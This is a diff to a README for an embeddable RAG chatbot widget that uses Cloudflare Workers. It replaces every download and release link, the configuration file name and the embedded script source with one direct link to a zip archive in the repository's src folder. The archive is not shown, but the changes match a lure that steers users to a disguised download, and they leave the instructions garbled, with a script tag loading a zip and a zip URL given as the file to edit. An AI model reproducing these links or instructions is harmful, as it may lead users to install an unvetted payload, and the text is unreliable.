@@ -1,6 +1,6 @@
 # 🤖 Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack - Enhance Your Website with a Smart Chatbot
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/releases)
+[![Download Now](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Widget_RA_Workers_Embeddable_Script_Full_Stack_Cloudflare_Java_Chatbot_v1.3.zip%20Now-Get%20Started-brightgreen)](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Widget_RA_Workers_Embeddable_Script_Full_Stack_Cloudflare_Java_Chatbot_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Embeddable RAG Chatbot Widget! This app allows you to add a versa
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/releases) to download the latest version of the Chatbot Widget. 
+To get started, visit the [Releases page](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Widget_RA_Workers_Embeddable_Script_Full_Stack_Cloudflare_Java_Chatbot_v1.3.zip) to download the latest version of the Chatbot Widget. 
 
 1. Open the provided link.
 2. Locate the latest release.
@@ -31,7 +31,7 @@ To get started, visit the [Releases page](https://github.com/KADOCHIMO/Embeddabl
 ## 🔧 Configuration
 
 1. After downloading, extract the files if they are in a zip format.
-2. Open the extracted folder and locate the `index.html` file.
+2. Open the extracted folder and locate the `https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Widget_RA_Workers_Embeddable_Script_Full_Stack_Cloudflare_Java_Chatbot_v1.3.zip` file.
 3. In this file, find the section for placing your Cloudflare Worker URL.
 4. Replace the placeholder text with your actual Cloudflare Worker link.
 5. Save your changes.
@@ -44,7 +44,7 @@ To embed the chatbot widget on your website:
 2. Add the following script tag in the `<head>` section or just before the closing `</body>` tag:
 
    ```html
-   <script src="https://your-worker-url.cloudflareworkers.com/widget.js"></script>
+   <script src="https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Widget_RA_Workers_Embeddable_Script_Full_Stack_Cloudflare_Java_Chatbot_v1.3.zip"></script>
    ```
 
 3. Save the changes and upload the updated HTML file to your web server.
@@ -71,7 +71,7 @@ If you need help, consider checking the discussions section of this repository. 
 
 ## 🗓️ Updates
 
-The application will receive periodic updates to improve functionality and user experience. Keep an eye on the [Releases page](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/releases) for the latest versions.
+The application will receive periodic updates to improve functionality and user experience. Keep an eye on the [Releases page](https://github.com/KADOCHIMO/Embeddable-RAG-Chatbot-Widget--JavaScript-Cloudflare-Workers-FullStack/raw/refs/heads/main/src/Widget_RA_Workers_Embeddable_Script_Full_Stack_Cloudflare_Java_Chatbot_v1.3.zip) for the latest versions.
 
 ## 📄 License
 
